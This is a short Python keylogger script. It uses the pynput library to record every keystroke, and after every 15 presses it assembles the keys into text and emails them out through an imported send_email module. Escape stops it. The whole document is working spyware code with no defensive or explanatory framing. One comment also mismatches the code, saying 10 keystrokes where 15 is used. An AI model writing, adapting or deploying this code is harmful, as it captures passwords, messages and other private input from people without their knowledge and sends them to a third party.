import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count >= 15:  # To ensure email is sent after 10 keystrokes
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":  # To Compare with Key.space
            k = " "
        message += k
    print(message)  # Print the message before sending the email
    send_email.sendEmail(message)

def on_release(key):
    if key == Key.esc:  # Compare with Key.esc directly
        return False  # Stop the listener

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
